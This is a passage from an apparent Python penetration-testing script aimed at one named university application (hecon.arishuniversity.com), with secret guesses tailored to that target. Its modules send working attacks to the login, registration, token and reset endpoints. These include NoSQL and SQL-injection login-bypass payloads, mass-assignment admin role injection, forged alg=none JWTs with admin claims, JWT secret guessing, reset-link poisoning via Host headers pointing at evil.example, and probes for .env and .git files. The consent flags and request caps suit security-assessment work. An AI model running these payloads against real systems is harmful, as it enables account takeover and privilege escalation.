        ctx["api_bases"].insert(0, api_base_override.rstrip("/"))
        ctx["api_base"] = api_base_override.rstrip("/")
        universe.add(api_base_override.rstrip("/"))
        for ep in list(universe):
            if ep.startswith("/"):
                universe.add(api_base_override.rstrip("/") + ep)
    if login_path_override:
        ctx["login_url"] = _abs(login_path_override)
        report.add(Finding(
            "DISC", "INFO",
            "Login endpoint set via --login-path: %s" % ctx["login_url"],
            "Manual override; discovery probing skipped for login.",
            [], "", "C1"))

    # probe login candidates. A real login endpoint usually answers POST
    # with 400/401/422 JSON validation rather than an HTML 404. Many
    # backends also answer EVERY unknown route with a JSON 404 catch-all,
    # so we use a differential probe: a real login endpoint reacts
    # differently to a garbage user vs the likely-real user "admin",
    # while a catch-all returns the same body for both.
    # forgot/reset/refresh/logout routes are NOT login endpoints.
    def _json_route(rr: Dict[str, Any]) -> bool:
        b = rr["body"].lstrip()
        return rr["ok"] and (b.startswith(("{", "[")) or
                             "application/json" in rr["headers"].get(
                                 "Content-Type", "").lower())

    def _excluded(ep: str) -> bool:
        low = ep.lower()
        return any(k in low for k in ("forgot", "reset", "logout",
                                      "refresh"))

    # probe order: system-user logins first, then participant logins,
    # then the rest (alphabetical alone put unified-login first)
    def _login_key(u: str) -> Tuple[int, int]:
        low = u.lower()
        if "users/login" in low or "user/login" in low:
            pri = 0
        elif "participants/login" in low or "participant/login" in low:
            pri = 1
        elif "unified-login" in low or "signin" in low:
            pri = 2
        else:
            pri = 3
        return (pri, len(u))

    # tier 1: login-shaped routes actually seen in the JS bundle
    tier1: List[str] = []
    for e in sorted(ctx["endpoints"], key=len):
        if any(k in e.lower() for k in ("login", "signin")):
            tier1.append(e)
    # harvested Angular post paths + prop paths (V6): attach to API base
    for e in sorted(ctx["post_paths"], key=len):
        if any(k in e.lower() for k in ("login", "signin")):
            tier1.append(e)
            for pp in ctx["prop_paths"]:
                tier1.append("/" + pp.lstrip("/") + e.lstrip("/"))
    for pp in ctx["prop_paths"]:
        if any(k in pp.lower() for k in ("login", "signin")):
            tier1.append("/" + pp.lstrip("/"))
    tier1 = [(_abs(e), e) for e in dict.fromkeys(tier1)]
    tier1_urls = sorted(dict.fromkeys(u for u, _ in tier1),
                        key=_login_key)

    priority = [_abs(e) for e in sorted(universe)
                if any(k in e.lower() for k in ("login", "signin")) and
                not _excluded(e)]
    fallback = [_abs(e) for e in sorted(universe)
                if e not in priority and not _excluded(e) and
                any(e.lower().endswith(k) for k in ("/token", "/session",
                                                    "/authenticate"))]
    tier1_set = set(tier1_urls)
    tier2 = [e for e in dict.fromkeys(priority + fallback)
             if e not in tier1_set]

    tier2.sort(key=_login_key)

    CATCH_ALL_HINTS = ("not found", "no route", "unknown route",
                       "cannot post", "route not")
    chosen: Optional[str] = None
    maybe: Optional[str] = None
    diff_budget = 3  # differential probes cost 1 failed 'admin' login each
    seen = 0
    for u in (tier1_urls + tier2):
        if seen >= 30 or diff_budget < 0:
            break
        seen += 1
        ra = req("POST", u, session,
                 json_body={"email": "sectest_repro@invalid.example",
                            "password": "x"})
        if not _json_route(ra):
            continue  # HTML 404 page -> route does not exist
        if ra["status"] not in (404, 405, 501):
            chosen = u  # validation-style response = real login endpoint
            report.add(Finding(
                "DISC", "INFO", "Login endpoint found: " + u,
                "POST answered with a JSON validation response (HTTP %d) "
                "- this is the authentication route." % ra["status"],
                ["POST %s -> %d %s" % (u, ra["status"], ra["body"][:160])],
                curl_for("POST", u, '{"email":"a@b.c","password":"x"}',
                         {"Content-Type": "application/json"}), "C1"))
            break
        # JSON 404 - real route with a not-found user, or a catch-all?
        if maybe is None:
            maybe = u
        if diff_budget > 0:
            diff_budget -= 1
            rb = req("POST", u, session,
                     json_body={"email": "admin", "password": "x"})
            if _json_route(rb) and (ra["status"] != rb["status"] or
                                    ra["body"][:100] != rb["body"][:100]):
                chosen = u
                report.add(Finding(
                    "DISC", "INFO", "Login endpoint found: " + u,
                    "Responses differ for unknown vs existing username "
                    "(HTTP %d vs %d) - this is the real login route and "
                    "it likely leaks user existence."
                    % (ra["status"], rb["status"]),
                    ["garbage user -> %s" % ra["body"][:120],
                     "'admin' user    -> %s" % rb["body"][:120]],
                    curl_for("POST", u,
                             '{"email":"a@b.c","password":"x"}',
                             {"Content-Type": "application/json"}), "C1"))
                break
    if chosen is None and maybe is not None:
        chosen = maybe
        report.add(Finding(
            "DISC", "LOW", "Probable login endpoint (weak evidence)",
            "Every candidate answered with an identical JSON catch-all. "
            "The first JSON-answering candidate is used; confirm manually.",
            [], "", "C1"))
    if chosen:
        ctx["login_url"] = chosen

    # register/reset discovery. POST probes are only sent with the
    # matching consent flag (register creates data, reset may trigger
    # emails); otherwise fall back to OPTIONS. Catch-all JSON "not
    # found" responses are rejected so a real route is preferred.
    def _is_catch_all(rr: Dict[str, Any]) -> bool:
        return rr["status"] == 404 and any(
            h in rr["body"].lower() for h in CATCH_ALL_HINTS)

    reg_cands = sorted(
        [e for e in universe if any(k in e.lower()
                                    for k in ("register", "signup"))],
        key=lambda e: (0 if "register-public" in e.lower() else 1,
                       len(e), e))
    reset_cands = sorted(
        [e for e in universe if any(k in e.lower()
                                    for k in ("reset", "forgot"))],
        key=lambda e: (0 if "send-otp" in e.lower() else
                       (1 if "forgot" in e.lower() else 2),
                       len(e), e))

    for ep in reg_cands[:10]:
        rr = req("OPTIONS", _abs(ep), session)
        if rr["ok"] and rr["status"] not in (404, 405, 501):
            ctx["register_url"] = _abs(ep)
            break
    if not ctx["register_url"] and allow_register:
        for ep in reg_cands[:10]:
            rr = req("POST", _abs(ep), session,
                     json_body={"email": "sectest_repro@invalid.example",
                                "password": "x", "name": "SECTEST"})
            if _json_route(rr) and not _is_catch_all(rr):
                ctx["register_url"] = _abs(ep)
                break
    if allow_reset:
        for ep in reset_cands[:14]:
            rr = req("POST", _abs(ep), session,
                     json_body={"email": "sectest_repro@invalid.example"})
            if _json_route(rr) and not _is_catch_all(rr):
                ctx["reset_url"] = _abs(ep)
                break
    if not ctx["reset_url"]:
        for ep in reset_cands[:14]:
            rr = req("OPTIONS", _abs(ep), session)
            if rr["ok"] and rr["status"] not in (404, 405, 501):
                ctx["reset_url"] = _abs(ep)
                break

    # [V6] OTP reset flow: derive verify/confirm URLs from send-otp URL
    if ctx["reset_url"] and "send-otp" in ctx["reset_url"]:
        ctx["otp_send_url"] = ctx["reset_url"]
        ctx["otp_verify_url"] = ctx["reset_url"].replace(
            "send-otp", "verify-otp")
        ctx["otp_confirm_url"] = ctx["reset_url"].replace(
            "send-otp", "confirm")

    report.add(Finding(
        "DISC", "OK", "Discovery finished",
        "framework=%s; bundles=%d; api_base=%s; login=%s; satellites=%s"
        % (ctx["framework"], len(ctx["bundles"]),
           ctx["api_base"] or "not found",
           ctx["login_url"] or "not found",
           ", ".join(ctx["satellites"]) or "none"),
        (["bundle: %s" % b for b in ctx["bundles"][:6]] if
         not ctx["api_bases"] else []), "", "C1"))
    return ctx


# ---------------------------------------------------------------------------
# Module TRANS  [C9] - headers, TLS, cookie flags, dotfiles
# ---------------------------------------------------------------------------
SECURITY_HEADERS = [
    ("strict-transport-security", "HSTS missing - downgrade/SSL-strip risk"),
    ("content-security-policy", "CSP missing - XSS impact is unbounded"),
    ("x-content-type-options", "nosniff missing"),
    ("x-frame-options", "clickjacking protection missing"),
    ("referrer-policy", "Referrer-Policy missing"),
]


def trans_tests(session: requests.Session, base: str, report: Report,
                api_base: Optional[str] = None) -> None:
    print("\n=== TRANS  [C9] transport + headers + dotfiles ===")
    # check BOTH the SPA host and the API host (API headers matter most:
    # that is where tokens cross the wire)
    targets = [base] + ([api_base] if api_base and
                        urlparse(api_base).hostname !=
                        urlparse(base).hostname else [])
    for tgt in targets:
        _trans_one_host(session, tgt, report, is_api=(tgt != base))


def _trans_one_host(session: requests.Session, base: str, report: Report,
                    is_api: bool = False) -> None:
    tag = "API host" if is_api else "SPA host"
    r = req("GET", base, session)
    if not r["ok"]:
        report.add(Finding(
            "TRANS", "INFO", "Base unreachable from this network",
            "See DISC module - run from an allowed network.",
            [r.get("error", "")], "", "C9"))
        return
    hdrs = {k.lower(): v for k, v in r["headers"].items()}

    missing = []
    for name, why in SECURITY_HEADERS:
        if name not in hdrs:
            missing.append("%s (%s)" % (name, why))
    if missing:
        report.add(Finding(
            "TRANS", "MEDIUM", "Missing security headers (%d) [%s]"
            % (len(missing), tag),
            "The main response lacks baseline hardening headers. For an "
            "auth app, missing CSP + HSTS materially raises XSS and "
            "token-theft risk." + (" This is the API host - HSTS + "
            "nosniff here protect every token response." if is_api
            else ""), missing,
            "curl -skI %s" % base, "C9"))
    else:
        report.add(Finding("TRANS", "OK", "All baseline security headers "
                           "present [%s]" % tag, "", [], "", "C9"))

    if "server" in hdrs or "x-powered-by" in hdrs:
        report.add(Finding(
            "TRANS", "LOW", "Server banner disclosed [%s]" % tag,
            "Versioned banners help attackers match exploits.",
            ["Server: %s | X-Powered-By: %s" % (
                hdrs.get("server", "-"), hdrs.get("x-powered-by", "-"))],
            "curl -skI %s" % base, "C9"))

    if r["cookies"]:
        flags = []
        c = r["cookies"].lower()
        if "httponly" not in c:
            flags.append("HttpOnly missing (token readable by XSS)")
        if "secure" not in c:
            flags.append("Secure missing (token sent over http)")
        if "samesite" not in c:
            flags.append("SameSite missing (CSRF exposure)")
        report.add(Finding(
            "TRANS", "HIGH" if flags else "OK",
            "Session cookie flags: %s" % ("problems found" if flags
                                          else "ok"),
            "; ".join(flags) or "cookie flags look correct",
            [r["cookies"]], "curl -skI %s" % base, "C9"))

    # V3 - dotfiles: confirm exact status codes from an allowed network
    # (SPA webroot only - the API host does not serve these files)
    if not is_api:
        for path in ("/.env", "/.git/config", "/.git/HEAD", "/backup.zip",
                     "/db.sqlite3", "/.htaccess", "/composer.json",
                     "/web.config"):
            rr = req("GET", base + path, session)
            if rr["ok"] and rr["status"] == 200 and len(rr["body"]) > 0:
                report.add(Finding(
                    "TRANS", "CRITICAL", "Sensitive file exposed: " + path,
                    "Publicly readable at HTTP 200. If this is .env or git "
                    "metadata it can leak DB credentials, APP_KEY and SMTP "
                    "creds -> full account takeover via direct DB access.",
                    [rr["body"][:400]], "curl -sk %s%s" % (base, path),
                    "C9"))
            elif rr["ok"]:
                if VERBOSE:
                    print("  [trans] %s -> %d (%d bytes)" % (
                        path, rr["status"], len(rr["body"])))

    # TLS certificate check (https targets only)
    host = urlparse(base).hostname or ""
    if (urlparse(base).scheme or "http") != "https":
        report.add(Finding(
            "TRANS", "HIGH", "Target served over plain HTTP [%s]" % tag,
            "Credentials/tokens would transit unencrypted. (If you see "
            "this on the mock test only, ignore.)", [], "", "C9"))
    elif not is_api:
      try:
        import hashlib as _h
        ctxs = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=10) as sock:
            with ctxs.wrap_socket(sock, server_hostname=host) as ssock:
                der = ssock.getpeercert(binary_form=True)
                sha = _h.sha256(der).hexdigest()
                report.add(Finding(
                    "TRANS", "INFO", "TLS handshake succeeded",
                    "TLS works; verify chain/expiry with: "
                    "openssl s_client -connect %s:443 (cert sha256 "
                    "%s...)" % (host, sha[:16]), [], "", "C9"))
      except Exception as exc:
        report.add(Finding(
            "TRANS", "MEDIUM", "TLS handshake issue",
            "Could not complete a strict-TLS handshake: %s" % str(exc)[:160],
            [], "", "C9"))

# ---------------------------------------------------------------------------
# Module ENUM  [C3] - user enumeration on login
# ---------------------------------------------------------------------------
def enum_tests(session: requests.Session, ctx: Dict[str, Any],
               report: Report, probe_user: Optional[str]) -> None:
    print("\n=== ENUM  [C3] user enumeration on login ===")
    url = ctx.get("login_url")
    if not url:
        report.add(Finding("ENUM", "INFO", "Login endpoint unknown",
                           "DISC did not locate the login route; enumeration "
                           "skipped.", [], "", "C3"))
        return
    bogus = "sectest_repro_%d@invalid.example" % random.randint(1000, 9999)
    r1 = req("POST", url, session,
             json_body={"email": bogus, "password": "WrongPass!123"})
    evidence = ["nonexistent user -> HTTP %d in %.0f ms: %s" % (
        r1["status"], r1["elapsed"] * 1000, r1["body"][:200])]
    diff_signal = None
    if probe_user:
        r2 = req("POST", url, session,
                 json_body={"email": probe_user,
                            "password": "WrongPass!123"})
        evidence.append("real user '%s' -> HTTP %d in %.0f ms: %s" % (
            probe_user, r2["status"], r2["elapsed"] * 1000,
            r2["body"][:200]))
        if r1["status"] != r2["status"] or \
                r1["body"][:120] != r2["body"][:120]:
            diff_signal = "status/body differs between unknown and known " \
                          "user"
        dt = abs(r1["elapsed"] - r2["elapsed"])
        if dt > 0.5:
            diff_signal = (diff_signal or "") + \
                " timing delta %.0f ms" % (dt * 1000)
    # message-quality check even without a probe user
    msg = r1["body"].lower()
    leaky = any(k in msg for k in ("not found", "no user", "does not exist",
                                   "unknown user", "user doesn", "email is "
                                   "not registered", "account not"))
    if leaky or diff_signal:
        report.add(Finding(
            "ENUM", "MEDIUM", "User enumeration via login responses",
            "The login endpoint answers differently for unknown accounts "
            "(%s). An attacker can harvest valid emails before attempting "
            "takeover." % (diff_signal or "explicit 'user not found' text"),
            evidence,
            curl_for("POST", url,
                     '{"email":"%s","password":"WrongPass!123"}' % bogus,
                     {"Content-Type": "application/json"}), "C3"))
    else:
        report.add(Finding(
            "ENUM", "OK", "No obvious user enumeration",
            "Responses for unknown users are generic and uniform (verify "
            "with --probe-user for a stronger check).",
            evidence, "", "C3"))


# ---------------------------------------------------------------------------
# Module BYPASS  [C4] - authentication bypass payloads
# ---------------------------------------------------------------------------
NOSQL_PAYLOADS = [
    ('operator $gt both', {"email": {"$gt": ""}, "password": {"$gt": ""}}),
    ('operator $ne both', {"email": {"$ne": "x"}, "password": {"$ne": "x"}}),
    ('operator $regex', {"email": {"$regex": ".*"},
                         "password": {"$regex": ".*"}}),
    ('operator $gt pw only', {"email": "admin", "password": {"$gt": ""}}),
]
SQLI_PAYLOADS = [
    ("tautology OR", "' OR '1'='1", "' OR '1'='1"),
    ("comment out pw", "admin'--", "anything"),
    ("tautology eq", "' OR 1=1 --", "' OR 1=1 --"),
]
TYPE_CONFUSION = [
    ('bool true password', {"email": "admin", "password": True}),
    ('empty array both', {"email": [], "password": []}),
    ('nested object', {"email": {"username": "admin"}, "password": {}}),
]


def bypass_tests(session: requests.Session, ctx: Dict[str, Any],
                 report: Report, probe_user: Optional[str]) -> None:
    print("\n=== BYPASS  [C4] auth bypass payloads against login ===")
    url = ctx.get("login_url")
    if not url:
        report.add(Finding("BYPASS", "INFO", "Login endpoint unknown",
                           "Bypass payloads not sent (no login route found).",
                           [], "", "C4"))
        return
    tests: List[Tuple[str, Any, str]] = []
    for name, payload in NOSQL_PAYLOADS:
        p = dict(payload)
        if probe_user and isinstance(p.get("email"), str):
            p["email"] = probe_user
        tests.append(("NoSQL " + name, p, "json"))
    for name, e, p in SQLI_PAYLOADS:
        tests.append(("SQLi " + name, {"email": e, "password": p}, "json"))
        tests.append(("SQLi-form " + name,
                      "email=%s&password=%s" % (e, p), "form"))
    for name, payload in TYPE_CONFUSION:
        p = dict(payload)
        if probe_user and isinstance(p.get("email"), str):
            p["email"] = probe_user
        tests.append(("Type " + name, p, "json"))

    hit_any = False
    for name, payload, mode in tests:
        if mode == "json":
            rr = req("POST", url, session, json_body=payload)
            body_hint = json.dumps(payload)[:120]
        else:
            rr = req("POST", url, session, data=payload,
                     headers={"Content-Type":
                              "application/x-www-form-urlencoded"})
            body_hint = str(payload)[:120]
        if looks_like_login_success(rr):
            hit_any = True
            tok = extract_token(rr["body"])
            report.add(Finding(
                "BYPASS", "CRITICAL", "AUTH BYPASS: " + name,
                "Payload authenticated without a valid password and the "
                "response carries a session/token. This is full account "
                "control. Payload class: %s." % name,
                ["HTTP %d | %s" % (rr["status"], rr["body"][:300]),
                 "token: %s" % ((tok[:40] + "...") if tok else "cookie "
                                "session set")],
                curl_for("POST", url, body_hint,
                         {"Content-Type": "application/json"}), "C4"))
    if not hit_any:
        report.add(Finding(
            "BYPASS", "OK", "No bypass from %d payload classes" % len(tests),
            "NoSQL operators, SQLi tautology/time-based and JSON type "
            "confusion were all rejected. (Time-based SQLi timing is also "
            "visible in --verbose.)", [], "", "C4"))


# ---------------------------------------------------------------------------
# Module MASSIGN  [C5] - mass assignment on registration (opt-in)
# ---------------------------------------------------------------------------
def massign_tests(session: requests.Session, ctx: Dict[str, Any],
                  report: Report, base: str) -> None:
    print("\n=== MASSIGN  [C5] role injection on registration ===")
    url = ctx.get("register_url")
    stamp = random.randint(10000, 99999)
    email = "sectest_repro_%d@example.com" % stamp
    pw = "SecTest!%d" % stamp
    if not url:
        report.add(Finding("MASSIGN", "INFO",
                           "Register endpoint unknown",
                           "DISC found no registration route; mass-"
                           "assignment test skipped.", [], "", "C5"))
        return
    variants = [
        ("plain", {"email": email, "password": pw, "name": "SECTEST"}),
        ("role admin", {"email": email, "password": pw, "name": "SECTEST",
                        "role": "admin"}),
        ("isAdmin true", {"email": email, "password": pw,
                          "name": "SECTEST", "isAdmin": True}),
        ("is_admin true", {"email": email, "password": pw,
                           "name": "SECTEST", "is_admin": True}),
    ]
    for name, payload in variants:
        rr = req("POST", url, session, json_body=payload)
        if rr["ok"] and rr["status"] < 300:
            tok = extract_token(rr["body"])
            ev = ["HTTP %d | %s" % (rr["status"], rr["body"][:300])]
            sev, title = "INFO", "Account created: " + name
            if tok:
                claims = jwt_decode(tok)
                role = ""
                if claims:
                    role = str(claims.get("role", claims.get(
                        "isAdmin", claims.get("is_admin", ""))))
                if role and role.lower() in ("admin", "true", "1", "root"):
                    sev, title = "CRITICAL", \
                        "PRIVILEGE ESCALATION via mass assignment: " + name
                    ev.append("token role claim = %s" % role)
            report.add(Finding("MASSIGN", sev, title,
                               "Registration accepted the injected "
                               "privilege field. If the elevated role is "
                               "honored, any visitor can mint an admin "
                               "account - full takeover.", ev,
                               curl_for("POST", url,
                                        json.dumps(payload),
                                        {"Content-Type":
                                         "application/json"}), "C5"))
            print("  [massign] cleanup reminder: delete account %s" % email)
            return
    report.add(Finding("MASSIGN", "OK",
                       "Registration rejected injected role fields",
                       "No privilege field survived on the registration "
                       "endpoint (first successful variant was checked "
                       "only).", [], "", "C5"))


# ---------------------------------------------------------------------------
# Module JWT  [C6] - token weaknesses
# ---------------------------------------------------------------------------
WEAK_SECRETS = [
    "secret", "secretkey", "secret_key", "jwt_secret", "JWT_SECRET",
    "hecon", "arish", "arishuniversity", "university", "password",
    "123456", "key", "mysecret", "dev", "test", "changeme", "supersecret",
    "jwt", "token", "s3cr3t", "abcd1234", "admin", "qwerty",
]


def jwt_decode(token: str) -> Optional[Dict[str, Any]]:
    try:
        h, p, _ = token.split(".")
        pad = lambda s: s + "=" * (-len(s) % 4)  # noqa: E731
        return json.loads(base64.urlsafe_b64decode(pad(p)))
    except Exception:
        return None


def jwt_tests(session: requests.Session, ctx: Dict[str, Any],
              report: Report, token_opt: Optional[str]) -> None:
    print("\n=== JWT  [C6] token analysis and forgery ===")
    tok = token_opt
    if not tok:
        report.add(Finding("JWT", "INFO", "No token supplied",
                           "Pass --token <JWT> (from any logged-in session) "
                           "to enable forgery tests.", [], "", "C6"))
        return
    parts = tok.split(".")
    if len(parts) != 3:
        report.add(Finding("JWT", "INFO", "Token is not a JWT",
                           "Session token does not look like a JWT; if it "
                           "is an opaque server-side session ID, check for "
                           "predictability instead.", [], "", "C6"))
        return
    try:
        pad = lambda s: s + "=" * (-len(s) % 4)  # noqa: E731
        header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
    except Exception:
        report.add(Finding("JWT", "LOW", "Undecodable JWT",
                           "Header/payload could not be base64-decoded.",
                           [], "", "C6"))
        return
    print("  [jwt] header=%s" % json.dumps(header))
    print("  [jwt] payload=%s" % json.dumps(payload)[:400])

    alg = str(header.get("alg", "")).lower()
    if alg in ("none", ""):
        report.add(Finding("JWT", "CRITICAL", "JWT accepts alg=none family",
                           "Token is signed with 'none' - anyone can forge "
                           "any identity, including admin.",
                           [json.dumps(header)], "", "C6"))
    if "exp" not in payload:
        report.add(Finding("JWT", "HIGH", "JWT has no expiry (exp claim)",
                           "Stolen tokens work forever; there is no time "
                           "window limiting reuse after a compromise.",
                           [json.dumps({k: payload.get(k) for k in
                                        ("sub", "role", "iat", "exp")})
                            if isinstance(payload, dict) else ""], "", "C6"))
    if "kid" in header and ("../" in str(header["kid"]) or
                            str(header["kid"]).startswith("/")):
        report.add(Finding("JWT", "MEDIUM", "JWT kid looks path-based",
                           "A filesystem 'kid' may be vulnerable to path "
                           "traversal key confusion.",
                           [json.dumps(header)], "", "C6"))

    # alg=none forgery against a protected endpoint
    target = None
    cands = ["/api/me", "/api/auth/me", "/api/profile", "/api/users",
             "/api/dashboard"]
    api_base = ctx.get("api_base")
    if api_base:
        # [V7] real controller routes discovered in the bundle
        cands = [api_base.rstrip("/") + "/" + p for p in
                 ("Users/", "MyApplicationUser/", "Participants/")] + cands
    for cand in cands:
        u = cand if cand.startswith("http") else \
            urljoin(ctx["base"] + "/", cand.lstrip("/"))
        rr = req("GET", u, session,
                 headers={"Authorization": "Bearer " + tok})
        if rr["ok"] and rr["status"] < 300:
            target = u
            break
    if target:
        forged_h = base64.urlsafe_b64encode(
            b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
        admin_payload = dict(payload)
        admin_payload.update({"role": "admin", "isAdmin": True,
                              "exp": int(time.time()) + 86400})
        forged_p = base64.urlsafe_b64encode(json.dumps(
            admin_payload).encode()).rstrip(b"=").decode()
        forged = "%s.%s." % (forged_h, forged_p)
        rr = req("GET", target, session,
                 headers={"Authorization": "Bearer " + forged})
        if rr["ok"] and rr["status"] < 300:
            report.add(Finding(
                "JWT", "CRITICAL", "FORGED alg=none token ACCEPTED",
                "The API accepted an unsigned token with elevated claims. "
                "This is total authentication bypass.", [
                    "GET %s -> %d" % (target, rr["status"]),
                    rr["body"][:250]],
                "curl -sk '%s' -H 'Authorization: Bearer %s'" % (
                    target, forged), "C6"))
        # weak HMAC secret
        if alg.startswith("hs"):
            found = None
            for cand_secret in WEAK_SECRETS:
                test = "%s.%s" % (parts[0], parts[1])
                sig = base64.urlsafe_b64encode(
                    hmac.new(cand_secret.encode(), test.encode(),
                             hashlib.sha256).digest()
                ).rstrip(b"=").decode()
                if sig == parts[2] or sig.rstrip("=") == parts[2]:
                    found = cand_secret
                    break
            if found:
                report.add(Finding(
                    "JWT", "CRITICAL", "JWT signing secret is weak: "
                    "'%s'" % found,
                    "The HMAC secret was guessed from a tiny wordlist. "
                    "Attackers can mint admin tokens offline at will.",
                    ["secret = %s" % found], "", "C6"))
            else:
                report.add(Finding(
                    "JWT", "OK", "JWT secret not in mini wordlist",
                    "%d common guesses failed (not proof of strength - "
                    "run hashcat/jwt-tool for a real audit)."
                    % len(WEAK_SECRETS), [], "", "C6"))

# ---------------------------------------------------------------------------
# Module RESET  [C7] - password reset flaws (opt-in)
# ---------------------------------------------------------------------------
def reset_tests(session: requests.Session, ctx: Dict[str, Any],
                report: Report, probe_user: Optional[str]) -> None:
    print("\n=== RESET  [C7] password-reset flow ===")
    url = ctx.get("reset_url")
    if not url:
        report.add(Finding("RESET", "INFO", "Reset endpoint unknown",
                           "DISC found no reset route; reset tests skipped.",
                           [], "", "C7"))
        return
    email = probe_user or "sectest_repro@invalid.example"
    # 1) response leaks the reset token/code?
    rr = req("POST", url, session,
             json_body={"email": email},
             headers={"Host": "hecon.arishuniversity.com"})
    body = rr["body"]
    leaked = None
    for key in ("resetToken", "reset_token", "token", "code", "otp",
                "resetCode", "pin"):
        try:
            data = json.loads(body)
            if isinstance(data, dict) and key in data:
                leaked = "%s = %s" % (key, str(data[key])[:60])
                break
        except Exception:
            pass
    if not leaked:
        m = re.search(r"(eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-\.+/=]*)",
                      body)
        if m:
            leaked = "JWT in reset response: %s..." % m.group(1)[:40]
    if leaked:
        report.add(Finding(
            "RESET", "CRITICAL", "Password-reset token leaked in response",
            "The reset endpoint returns the reset secret to the caller. "
            "Anyone who knows an email can reset that account - full "
            "account takeover.", [leaked, body[:250]],
            curl_for("POST", url, '{"email":"%s"}' % email,
                     {"Content-Type": "application/json"}), "C7"))
    else:
        report.add(Finding("RESET", "OK",
                           "No reset token in response body",
                           "The reset endpoint response did not contain a "
                           "token/code field.", [body[:200]], "", "C7"))
    # 2) host-header poisoning of the reset link
    evil = "evil.example"
    rr2 = req("POST", url, session,
              json_body={"email": email},
              headers={"X-Forwarded-Host": evil})
    if evil in rr2["body"]:
        report.add(Finding(
            "RESET", "CRITICAL", "Reset link poisoned via X-Forwarded-Host",
            "The reset email/link is built from attacker-controlled host "
            "headers; victims clicking the link leak their reset token to "
            "%s." % evil, [rr2["body"][:250]],
            "curl -sk -X POST '%s' -H 'X-Forwarded-Host: %s' -H "
            "'Content-Type: application/json' --data '{\"email\":\"%s\"}'"
            % (url, evil, email), "C7"))
    else:
        rr3 = req("POST", url, session, json_body={"email": email},
                  headers={"Host": evil})
        if evil in rr3["body"]:
            report.add(Finding(
                "RESET", "CRITICAL", "Reset link poisoned via Host header",
                "The application builds reset URLs from the raw Host "
                "header.", [rr3["body"][:250]],
                "curl -sk -X POST '%s' -H 'Host: %s' -H 'Content-Type: "
                "application/json' --data '{\"email\":\"%s\"}'"
                % (url, evil, email), "C7"))

    # 3) [V6] HECON OTP reset flow (Participants/forgot-password/*)
    send_url = ctx.get("otp_send_url")
    if not send_url:
        return
    print("  [reset] OTP flow detected: %s" % send_url)
    rs = req("POST", send_url, session, json_body={"email": email})
    rs_body = rs["body"]
    otp_ev = ["POST send-otp -> HTTP %d: %s" % (rs["status"],
                                                rs_body[:200])]
    m_otp = re.search(r'"(?:otp|otpCode|code|pin)"\s*:\s*"?(\d{3,8})"?',
                      rs_body, re.I)
    if m_otp:
        report.add(Finding(
            "RESET", "CRITICAL", "OTP code leaked in send-otp response",
            "The OTP generation response contains the OTP itself. Anyone "
            "who knows an email can reset that account immediately - "
            "full account takeover.",
            otp_ev + ["leaked field value: %s" % m_otp.group(1)],
            curl_for("POST", send_url, '{"email":"%s"}' % email,
                     {"Content-Type": "application/json"}), "C7"))
    else:
        report.add(Finding(
            "RESET", "OK", "No OTP value in send-otp response",
            "The send-otp response returned a session/masked email only "
            "(OTP presumably delivered out-of-band).", otp_ev, "", "C7"))
    # rate-limit check: 3 more sends, same email (total 4 - capped)
    codes = [rs["status"]]
    for _ in range(3):
        rr2 = req("POST", send_url, session, json_body={"email": email})
        codes.append(rr2["status"])
    if any(c in (429, 423) for c in codes):
        report.add(Finding(
            "RESET", "OK", "OTP sending is rate-limited",
            "Send-OTP returned 429/423 within 4 requests.",
            ["statuses: %s" % codes], "", "C7"))
    else:
        report.add(Finding(
            "RESET", "MEDIUM", "No rate limiting on OTP send (4 requests)",
            "Four consecutive send-otp calls all returned normal "
            "responses. If OTP verification is not rate-limited either, "
            "an attacker can brute-force the OTP (typ. 4-6 digits) and "
            "reset ANY account. Manually verify with one real reset: "
            "attempt ~50 verify-otp calls and confirm a lockout.",
            ["statuses: %s" % codes],
            curl_for("POST", send_url, '{"email":"<victim>"}',
                     {"Content-Type": "application/json"}), "C7"))
    # verify-otp genericity (single attempt, fabricated or real session)
    verify_url = ctx.get("otp_verify_url")
    if verify_url:
        try:
            sess_json = json.loads(rs_body)
            real_sess = sess_json.get("resetSessionId") if isinstance(
                sess_json, dict) else None
        except Exception:
            real_sess = None
        sess = real_sess or "sectest-invalid-session"
        rv = req("POST", verify_url, session,
                 json_body={"resetSessionId": sess, "otpCode": "000000"})
        report.add(Finding(
            "RESET", "INFO",
            "verify-otp single probe (no brute force)",
            "One verify attempt with %s session + wrong OTP. Check the "
            "response: it must be generic AND the endpoint must lock out "
            "after a handful of attempts (manual confirmation needed)."
            % ("returned" if real_sess else "fabricated"),
            ["POST verify-otp -> HTTP %d: %s" % (rv["status"],
                                                 rv["body"][:200])],
            curl_for("POST", verify_url,
                     '{"resetSessionId":"%s","otpCode":"000000"}' % sess,
                     {"Content-Type": "application/json"}), "C7"))


# ---------------------------------------------------------------------------
# Module RATE  [C8] - login rate limiting (capped, non-destructive)
# ---------------------------------------------------------------------------
def rate_tests(session: requests.Session, ctx: Dict[str, Any],
               report: Report) -> None:
    print("\n=== RATE  [C8] login throttling (6 attempts max) ===")
    url = ctx.get("login_url")
    if not url:
        report.add(Finding("RATE", "INFO", "Login endpoint unknown",
                           "Rate-limit probe skipped.", [], "", "C8"))
        return
    statuses, times = [], []
    for i in range(6):  # hard cap - NOT brute force
        rr = req("POST", url, session,
                 json_body={"email": "sectest_repro_ratelimit@invalid"
                            ".example", "password": "WrongPass!%d" % i})
        statuses.append(rr["status"])
        times.append(rr["elapsed"] * 1000)
    throttled = any(s in (429, 423) for s in statuses)
    lockout = any(s in (401, 403) and t > 3 for s, t in
                  zip(statuses, times))
    evidence = ["attempt %d -> HTTP %d in %.0f ms" % (i + 1, s, t)
                for i, (s, t) in enumerate(zip(statuses, times))]
    if throttled or lockout:
        report.add(Finding("RATE", "OK", "Login throttling present",
                           "Server responded with 429/423 or severe delay "
                           "during repeated failures.", evidence, "", "C8"))
    else:
        report.add(Finding(
            "RATE", "MEDIUM", "No rate limiting after 6 failed logins",
            "All six consecutive failures returned normal responses with "
            "no 429, lockout or delay. Credential stuffing / password "
            "spraying is unrestricted.", evidence, "", "C8"))


# ---------------------------------------------------------------------------
# Module CORS  [C10] - origin reflection
# ---------------------------------------------------------------------------
def cors_tests(session: requests.Session, ctx: Dict[str, Any],
               report: Report) -> None:
    print("\n=== CORS  [C10] origin reflection ===")
    for origin in ("https://evil.example", "null"):
